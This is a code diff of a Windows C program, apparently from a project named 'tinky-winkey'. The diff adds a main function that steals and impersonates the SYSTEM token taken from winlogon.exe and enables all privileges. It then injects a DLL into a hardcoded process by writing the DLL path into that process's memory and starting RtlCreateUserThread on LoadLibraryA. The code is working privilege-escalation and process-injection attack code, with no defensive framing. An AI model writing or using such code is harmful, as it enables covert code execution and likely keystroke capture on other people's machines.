@@ -1,12 +1,22 @@
-#include "svc.h"
+#define WIN32_LEAN_AND_MEAN
+#include <windows.h>
+#include <tlhelp32.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <bcrypt.h>
+#include <winternl.h>
 
-// No user attached to the main thread before attaching a token to it.
-/**
- * Imprime le nom de l'utilisateur courant du processus.
- * 
- * Vu qu'il ny a pas d'utilisateur sur le thread principal, cette facon de proceder est necessaire pour comparer visuellement
- * si le programme tourne bien avec un nouvel utilisateur en comparaison de celui aui sera trouve ci-dessous.
- */
+
+
+typedef long (*_RtlCreateUserThread)(HANDLE,
+    PSECURITY_DESCRIPTOR,
+    BOOLEAN,ULONG,
+    PULONG,PULONG,
+    PVOID,PVOID,
+    PHANDLE,CLIENT_ID* );
+
+_RtlCreateUserThread RtlCreateUserThread;
+
 void PrintUserNameByProc(void)
 {
     TOKEN_USER tokenUser;
@@ -15,7 +25,7 @@ void PrintUserNameByProc(void)
 
     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
         printf("OpenProcessToken failed.\n");
-        PrintError();
+        1;
         return;
     }
     GetTokenInformation(hToken, TokenUser, &tokenUser, sizeof(tokenUser), &dwSize);
@@ -39,11 +49,11 @@ void PrintUserNameByProc(void)
         else
         {
             printf("LookupAccountSid failed.\n");
-            PrintError();
+            1;
         }
     }
     else
-        PrintError();
+        1;
     free(pTokenUser);
 }
 
@@ -58,7 +68,7 @@ void PrintUserNameByThread(void)
 
     if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE,&hToken)) {
         printf("OpenThreadToken failed.\n");
-        PrintError();
+        1;
         return;
     }
     GetTokenInformation(hToken, TokenUser, &tokenUser, sizeof(tokenUser), &dwSize);
@@ -77,11 +87,11 @@ void PrintUserNameByThread(void)
         else
         {
             printf("LookupAccountSid failed.\n");
-            PrintError();
+            1;
         }
     }
     else
-        PrintError();
+        1;
     free(pTokenUser);
 }
 
@@ -123,12 +133,12 @@ DWORD GetPIDByProcName(void)
 
     handleProc = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (handleProc == INVALID_HANDLE_VALUE)
-        exit(PrintError());
+        exit(1);
     pe32.dwSize = sizeof(PROCESSENTRY32);
     if (!Process32First(handleProc, &pe32))
     {
         CloseHandle(handleProc);
-        exit(PrintError());
+        exit(1);
     }
     if (!strcmp(pe32.szExeFile, "winlogon.exe"))
     {
@@ -170,7 +180,7 @@ BOOL EnableAllPrivilege(HANDLE currentToken)
     if (!AdjustTokenPrivileges(currentToken, FALSE, pPrivileges, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
     {
         printf("AdjustTokenPrivileges failed.\n");
-        exit(PrintError());
+        exit(1);
     }
     return TRUE;
 }
@@ -185,7 +195,7 @@ void ImpersonateSystemToken(void)
     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &currentToken))
     {
         printf("OpenProcessToken failed.\n");
-        exit(PrintError());
+        exit(1);
     }
     EnableAllPrivilege(currentToken);
     // no token attached to the current thread, so we use the proc instead.
@@ -196,33 +206,77 @@ void ImpersonateSystemToken(void)
     if (procHandle == NULL)
     {
         printf("Impossible to get the process handle.\n");
-        exit(PrintError());
+        exit(1);
     }
     BOOL success = OpenProcessToken(procHandle, TOKEN_DUPLICATE | TOKEN_QUERY, &sysToken);
     if (!success)
     {
         printf("Could not open the process token.\n");
-        exit(PrintError());
+        exit(1);
     }
     success = DuplicateTokenEx(sysToken, TOKEN_ALL_ACCESS_P, NULL, SecurityImpersonation,  TokenImpersonation, &newSysTok);
     if (!success)
     {
         printf("Could not duplicate the process token.\n");
-        exit(PrintError());
+        exit(1);
     }
     success = SetThreadToken((PHANDLE)NULL, newSysTok);
     if (!success)
     {
         printf("Failed to set the current thread's token.\n");
-        exit(PrintError());
+        exit(1);
     }
     PrintUserNameByThread();
     printf("\n=== Privileges for the thread after impersonation ===\n\n");
     if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, TRUE, &currentToken))
     {
         printf("OpenThreadToken failed.\n");
-        exit(PrintError());
+        exit(1);
     }
     EnableAllPrivilege(currentToken);
     PrintPrivileges(GetCurrentThreadToken()); 
+}
+
+int main(void)
+{
+    ImpersonateSystemToken();
+HANDLE procHdl = OpenProcess(PROCESS_ALL_ACCESS, TRUE, 2340);
+    if (procHdl == NULL)
+    {
+        printf("Failed\n");
+        exit(1);
+    }
+    LPCSTR dllPath = "E:\\tinky-winkey\\dll.dll";
+    printf("Thread began ?\n");
+    LPVOID baseAddr = VirtualAllocEx(procHdl, NULL, strlen(dllPath) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (baseAddr == NULL)
+    {
+        exit(1);
+    }
+    WriteProcessMemory(procHdl, baseAddr, dllPath, strlen(dllPath) + 1, NULL);
+    HMODULE ntdll=LoadLibrary("ntdll.dll");
+
+    RtlCreateUserThread=(_RtlCreateUserThread)GetProcAddress(ntdll,"RtlCreateUserThread");
+    LPVOID loadLib = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
+    HANDLE hThread;
+
+    NTSTATUS status = RtlCreateUserThread(
+        procHdl,
+        NULL,
+        FALSE,
+        0,
+        0,
+        0,
+        loadLib,
+        baseAddr,
+        &hThread,
+        NULL
+    );
+    if (!NT_SUCCESS(status)) {
+    char buf[128];
+    printf("RtlCreateUserThread failed: 0x%08X\n", status);
+}
+    WaitForSingleObject(hThread, INFINITE);
+    printf("Thread terminated ?\n");
+    exit(0);
 }
